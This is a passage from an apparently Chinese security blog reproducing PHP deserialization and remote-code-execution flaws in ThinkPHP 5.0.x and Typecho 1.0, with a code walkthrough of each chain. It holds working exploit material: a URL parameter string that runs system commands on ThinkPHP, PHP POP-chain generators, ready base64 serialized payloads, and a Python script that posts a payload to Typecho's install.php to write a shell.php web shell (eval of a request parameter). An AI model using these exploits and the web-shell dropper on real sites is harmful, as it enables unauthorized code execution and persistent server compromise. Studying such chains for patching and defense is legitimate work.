<p>上面代码表示只要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>u</mi><mi>l</mi><mi>e</mi><mtext>存在，并且</mtext></mrow><annotation encoding="application/x-tex">module存在，并且</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span></span></span></span> available 为 True，就可以初始化模块，并进行调用。</p>
<p>继续往下看代码，构造控制器的过程调用了 Loder::controller 方法，然后又调用了 self::getModuleAndClass 该方法就是获取 Module、Class 的，这里通过判断name中是否存在' \ '，若存在class就是name，此时name，此时name为think\App，因此 class=think\App，至此就成功调用了 App 类</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png" alt="img"></a></p>
<p>控制器之后会获取当前的操作名，跟进 self::invokeMethod ()</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png" alt="img"></a></p>
<p>该方法里用了 ReflectionMethod 来构造 App 类的 invokefunction 方法，然后就是调用 App::invokefunction ()</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png" alt="img"></a></p>
<p>跟进 App::invokefunction ()，最后就是执行命令的地方，利用 ReflectionFunction，来构造自己想要的函数执行即可，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>u</mi><mi>n</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>、</mtext></mrow><annotation encoding="application/x-tex">function、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">、</span></span></span></span>vars，都可以通过 $_GET 方式获取</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png" alt="img"></a></p>
<p>因此通过 url 传参 function=call_user_func_array&amp;vars [0]=system&amp;vars [1][]=whoami</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png"><img data-src="https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png" alt="img"></a></p>
<p>5.0.22 铺垫结束，其实真正的反序列化在 5.0.24，但利用条件苛刻，只有二次开发实现了反序列化才可以利用，在 /application/index/controller/Index.php 中添加反序列化反序列化触发点代码</p>
<p>所以只给个 payload，开摆！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    namespace think\session\driver;</span><br><span class="line">    use think\cache\driver\File;</span><br><span class="line">    class Memcached&#123;</span><br><span class="line">        protected $handler = null;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;handler = new File();  //此处赋值$this-&gt;handler为File类的一个对象，这样就可以调用File.php::set()方法</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    namespace think\cache;</span><br><span class="line">    abstract class Driver&#123;</span><br><span class="line">        function __construct()&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    namespace think\cache\driver;</span><br><span class="line">    use think\cache\Driver;</span><br><span class="line">    class File extends Driver&#123;  //此处重写File.php::set方法，构造写入的$filename</span><br><span class="line">        protected $tag;</span><br><span class="line">        protected $options = [];</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;tag = &#x27;nocatch&#x27;;</span><br><span class="line">            $this-&gt;options = [</span><br><span class="line">                &#x27;cache_subdir&#x27;=&gt;false,</span><br><span class="line">                &#x27;prefix&#x27;=&gt;&#x27;&#x27;,</span><br><span class="line">                &#x27;path&#x27;=&gt;&#x27;php://filter/write=string.rot13/resource=./static/&lt;?cuc cucvasb();?&gt;&#x27;,  //rot13编码</span><br><span class="line">                &#x27;data_compress&#x27;=&gt;false,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    namespace think\console;</span><br><span class="line">    use think\session\driver\Memcached;</span><br><span class="line">    class Output&#123;</span><br><span class="line">        private $handle = null;</span><br><span class="line">        protected $styles = [];</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;styles = [&#x27;removeWhereField&#x27;];  </span><br><span class="line">            $this-&gt;handle = new Memcached();  //此处赋值$this-&gt;handle为Memcached的一个对象，来调用Memcached::write()方法</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    namespace think\model;</span><br><span class="line">    use think\console\Output;</span><br><span class="line">    abstract class Relation&#123;</span><br><span class="line">          protected $query;</span><br><span class="line">          protected $foreignKey;</span><br><span class="line">          function __construct()&#123;</span><br><span class="line">            $this-&gt;query = new Output();  //此处赋值$this-&gt;query为Output的一个对象，这样因为不存在removeWhereField方法，从而会调用Output类的__call方法</span><br><span class="line">            $this-&gt;foreignKey = &quot;aaaaaaaaa&quot;;  //参数</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    namespace think\model\relation;</span><br><span class="line">    use think\model\Relation;</span><br><span class="line">    abstract class OneToOne extends Relation&#123;&#125;</span><br><span class="line"></span><br><span class="line">    namespace think\model\relation;</span><br><span class="line">    class HasOne extends OneToOne&#123;&#125;</span><br><span class="line"></span><br><span class="line">    namespace think;</span><br><span class="line">    use think\model\relation\HasOne;</span><br><span class="line">    use think\console\Output;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error;</span><br><span class="line">        protected $parent;</span><br><span class="line">         function __construct()&#123;</span><br><span class="line">            $this-&gt;append = [&#x27;bmjoker&#x27;=&gt;&#x27;getError&#x27;];</span><br><span class="line">            $this-&gt;error = new HasOne();  //此处赋值$this-&gt;error为类HasOne的一个对象</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    namespace think\process\pipes;</span><br><span class="line">    use think\model\concern\Conversion;</span><br><span class="line">    use think\model\Pivot;</span><br><span class="line">    class Windows</span><br><span class="line">    &#123;</span><br><span class="line">        private $files = [];</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files=[new Pivot()];  //此处赋值$filename为类Pivot的一个对象</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    namespace think\model;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model&#123;&#125;  //此处会自动调用Model类</span><br><span class="line"></span><br><span class="line">    use think\process\pipes\Windows;</span><br><span class="line">    echo base64_encode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>注意这个洞在 windows 下是复现不了的，因为 windows 对文件名有限制，会写入失败。</p>
<h3 id="typecho-反序列化漏洞"><a class="markdownIt-Anchor" href="#typecho-反序列化漏洞">#</a> typecho 反序列化漏洞</h3>
<p>复现条件：php=5.x typecho 版本 typecho-1.0-14.10.10-release</p>
<p>安装前先去数据库创建 typecho 库，不然安装时报错</p>
<p>url 中输入 (<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMToxODg4OC90eXBlY2hvLw==">http://127.0.0.1:18888/typecho/</span>) 自动跳转安装页面，里面的内容根据自己的填</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125094835151.png" alt="image-20221125094835151"></p>
<p>任意命令执行 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Typecho_Feed</span><br><span class="line">&#123;</span><br><span class="line">    const RSS1 = &#x27;RSS 1.0&#x27;;</span><br><span class="line">    const RSS2 = &#x27;RSS 2.0&#x27;;</span><br><span class="line">    const ATOM1 = &#x27;ATOM 1.0&#x27;;</span><br><span class="line">    const DATE_RFC822 = &#x27;r&#x27;;</span><br><span class="line">    const DATE_W3CDTF = &#x27;c&#x27;;</span><br><span class="line">    const EOL = &quot;\n&quot;;</span><br><span class="line">    private $_type;</span><br><span class="line">    private $_items;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_type = $this::RSS2;</span><br><span class="line">        $this-&gt;_items[0] = array(</span><br><span class="line">            &#x27;title&#x27; =&gt; &#x27;1&#x27;,</span><br><span class="line">            &#x27;link&#x27; =&gt; &#x27;1&#x27;,</span><br><span class="line">            &#x27;date&#x27; =&gt; 1508895132,</span><br><span class="line">            &#x27;category&#x27; =&gt; array(new Typecho_Request()),</span><br><span class="line">            &#x27;author&#x27; =&gt; new Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Typecho_Request</span><br><span class="line">&#123;</span><br><span class="line">    private $_params = array();</span><br><span class="line">    private $_filter = array();</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_params[&#x27;screenName&#x27;] = &#x27;phpinfo()&#x27;;    //替换phpinfo()这里进行深度利用</span><br><span class="line">        $this-&gt;_filter[0] = &#x27;assert&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = array(</span><br><span class="line">    &#x27;adapter&#x27; =&gt; new Typecho_Feed(),</span><br><span class="line">    &#x27;prefix&#x27; =&gt; &#x27;typecho_&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($exp));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</span><br></pre></td></tr></table></figure>
<p>访问：</p>
<p><code>http://localhost:18888/typecho/install.php?finish</code></p>
<p>通过 post 传入 payload：</p>
<p><code>__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</code></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125104636822.png" alt="image-20221125104636822"></p>
<p>通过 python 写 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line">import sys </span><br><span class="line">url = &quot;http://localhost/typecho/install.php?finish=&quot;</span><br><span class="line">payload = &quot;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9&quot; </span><br><span class="line">postData = &#123;&quot;__typecho_config&quot;:payload&#125; </span><br><span class="line">header =&#123; </span><br><span class="line">	&quot;Referer&quot;:url, </span><br><span class="line">	&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;&#125; </span><br><span class="line">	</span><br><span class="line">print(url) </span><br><span class="line">res = requests.get(url) </span><br><span class="line">if res.status_code == 200: </span><br><span class="line">	print(&quot;[+] install.php exist!&quot;) </span><br><span class="line">else: </span><br><span class="line">	print(&quot;[-] install.php not exist&quot;) </span><br><span class="line">	sys.exit() </span><br><span class="line">	</span><br><span class="line">res = requests.post(url = url,data = postData,headers = header) </span><br><span class="line">res = requests.get(url+&quot;shell.php&quot;) </span><br><span class="line">if res.status_code == 200: </span><br><span class="line">	print(&quot;[+] Shell.php write success!&quot;) </span><br><span class="line">	print(&quot;Shell path :&quot;,url+&quot;shell.php&quot;) </span><br><span class="line">else: </span><br><span class="line">	print(&quot;[-] GetShell Error!&quot;)</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125151707169.png" alt="image-20221125151707169" style="zoom: 67%;" />1</p>
<p>漏洞分析：</p>
<p>1.install.php</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153310059.png" alt="image-20221125153310059"></p>
<p>这里需要传入一个 finish 参数，然后在 230 行将 cookie 中的__typecho_config 的值通过 base64 解码之后反序列化。</p>
<p>而__typecho_config 是通过 cookie 传入的，在 install.php 中 528 行，set __typecho_config，并且将其序列化后 base64 编码</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153401994.png" alt="image-20221125153401994"></p>
<p>在 cookie.php 中，set 的定义：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153457221.png" alt="image-20221125153457221"></p>
<p>2.install.php</p>
<p>再往下看两行到 232 行，这里将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>f</mi><mi>i</mi><mi>g</mi><msup><mo stretchy="false">[</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>a</mi><mi>d</mi><mi>a</mi><mi>p</mi><mi>t</mi><mi>e</mi><msup><mi>r</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">]</mo><mtext>作为第一个参数传入到</mtext><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>h</mi><msub><mi>o</mi><mi>D</mi></msub><mi>b</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mtext>中。</mtext></mrow><annotation encoding="application/x-tex">config[&#x27;adapter&#x27;]作为第一个参数传入到Typecho_Db()中。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal">a</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">。</span></span></span></span>config 就是反序列化传来的对象，因此这个参数也是我们可控的。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153932537.png" alt="image-20221125153932537"></p>
<p>3.Db.php</p>
<p>跟进 Typecho_DB，构造函数中将’Typecho_Db_Adapter_’ 和 $adapterName 做了拼接</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154054082.png" alt="image-20221125154054082"></p>
<p>只要 $adapterName 是一个对象，那么这里就会调用其__toString () 方法。刚好，第一个参数是我们可控的。</p>
<p>4.feed.php</p>
<p>在 feed.php 中有 to_String 方法，to_String 方法中有如下</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154328760.png" alt="image-20221125154328760"></p>
<p>如果我们传入的 author 没有 screennaame 属性，那么就会调用__get () 方法。刚好，这里的 $item 是我们可控的。因此下面就找哪些类没有 screenName 属性，并且__get 方法存在危险操作。</p>
<p>5.Request.php</p>
<p>Typecho_Request 类中存在__get 方法</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154931232.png" alt="image-20221125154931232"></p>
<p>__get 会调用 get，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><msub><mo>&gt;</mo><mi>p</mi></msub><mi>a</mi><mi>r</mi><mi>a</mi><mi>m</mi><mi>s</mi><mtext>也可控，而</mtext></mrow><annotation encoding="application/x-tex">this-&gt; _params也可控，而</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">&gt;</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">而</span></span></span></span> key 正是 screenName，因此 $value 可控</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155023667.png" alt="image-20221125155023667"></p>
<p>get 调用_applyFilter</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155050806.png" alt="image-20221125155050806"></p>
<p>可以看到，这里有个 call_user_func 方法，且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>和</mtext></mrow><annotation encoding="application/x-tex">filter和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">和</span></span></span></span> value 都可控。至此这条 pop 链基本是构造完了。</p>
<p>最后重新分析一下 payload</p>
